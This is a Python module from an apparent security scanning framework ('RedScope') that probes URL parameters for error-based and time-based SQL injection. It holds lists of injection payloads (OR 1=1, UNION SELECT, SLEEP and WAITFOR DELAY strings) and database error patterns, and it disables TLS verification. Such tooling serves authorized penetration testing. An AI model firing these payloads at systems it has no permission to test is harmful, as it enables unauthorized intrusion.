import time
import re
from typing import List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

from core.base_module import BaseModule, ScanResult, Finding

ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark after the character string",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"error.*postgresql",
    # MSSQL
    r"microsoft sql server",
    r"odbc sql server driver",
    r"sqlserver jdbc driver",
    r"\[microsoft\]\[odbc",
    # Oracle
    r"oracle error",
    r"ora-[0-9]{4,5}",
    r"oracle.*driver",
    # SQLite
    r"sqlite_exception",
    r"sqlite error",
    r"sqlite3.operationalerror",
    # Generic
    r"syntax error.*sql",
    r"sql syntax.*error",
    r"database error",
    r"db error",
    r"division by zero",
    r"invalid query",
]

ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1' AND 1=CONVERT(int,@@version)--",
    "' AND 1=CAST(1 AS int)--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(0)--",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", "mysql"),
    ("'; WAITFOR DELAY '0:0:5'--", "mssql"),
    ("' AND pg_sleep(5)--", "postgresql"),
    ("' OR SLEEP(5)#", "mysql"),
    ("1 AND SLEEP(5)", "mysql"),
]


class Module(BaseModule):
    name = "sqli"
    description = "SQL injection scanner — error-based and time-based detection"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"SQLi scan on [bold]{url}[/]")

        params = self._extract_params(url)
        if not params:
            self.log.warning("No query parameters found in URL — trying common param names")
            params = ["id", "page", "cat", "search", "q", "user", "item", "product"]
            base_url = url
        else:
            base_url = url.split("?")[0]

        for param in params:
            self.log.info(f"  Testing parameter: [cyan]{param}[/]")

            finding = self._test_error_based(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)
                continue

            finding = self._test_time_based(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)

        if not result.findings:
            self.log.info("[dim]No SQLi detected[/]")

        return result

    def _test_error_based(self, session, base_url, param, timeout) -> Optional[Finding]:
        for payload in ERROR_PAYLOADS:
            try:
                resp = session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout,
                    verify=False,
                )
                body = resp.text.lower()
                for pattern in ERROR_PATTERNS:
                    if re.search(pattern, body):
                        self.log.info(f"  [bold red]SQLi FOUND[/] (error-based) param={param} payload={payload!r}")
                        return Finding(
                            title=f"SQL Injection (Error-Based) — parameter: {param}",
                            severity="critical",
                            description=(
                                f"Error-based SQL injection detected in parameter '{param}'. "
                                f"The server returned a database error message revealing the backend DBMS."
                            ),
                            evidence=(
                                f"URL: {base_url}?{param}={payload}\n"
                                f"Matched pattern: {pattern}\n"
                                f"Response excerpt: {self._excerpt(resp.text)}"
                            ),
                            remediation=(
                                "Use parameterized queries / prepared statements. "
                                "Never concatenate user input into SQL strings. "
                                "Suppress database error messages in production."
                            ),
                            tags=["sqli", "error-based", "web"],
                        )
            except requests.RequestException:
                continue
        return None

    def _test_time_based(self, session, base_url, param, timeout) -> Optional[Finding]:
        try:
            baseline = session.get(base_url, params={param: "1"}, timeout=timeout, verify=False)
            baseline_time = baseline.elapsed.total_seconds()
        except requests.RequestException:
            baseline_time = 1.0

        for payload, dbms in TIME_PAYLOADS:
            try:
                start = time.time()
                session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout + 8,
                    verify=False,
                )
                elapsed = time.time() - start

                if elapsed >= (baseline_time + 4):
                    self.log.info(f"  [bold red]SQLi FOUND[/] (time-based/{dbms}) param={param} delay={elapsed:.1f}s")
                    return Finding(
                        title=f"SQL Injection (Time-Based Blind) — parameter: {param}",
                        severity="critical",
                        description=(
                            f"Time-based blind SQL injection detected in parameter '{param}'. "
                            f"Response was delayed by {elapsed:.1f}s (baseline: {baseline_time:.1f}s), "
                            f"indicating successful {dbms.upper()} sleep injection."
                        ),
                        evidence=(
                            f"URL: {base_url}?{param}={payload}\n"
                            f"Baseline response time: {baseline_time:.2f}s\n"
                            f"Injected response time: {elapsed:.2f}s"
                        ),
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                        tags=["sqli", "time-based", "blind", "web"],
                    )
            except requests.RequestException:
                continue
        return None

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())

    def _excerpt(self, text: str, length: int = 200) -> str:
        text = " ".join(text.split())
        return text[:length] + ("..." if len(text) > length else "")
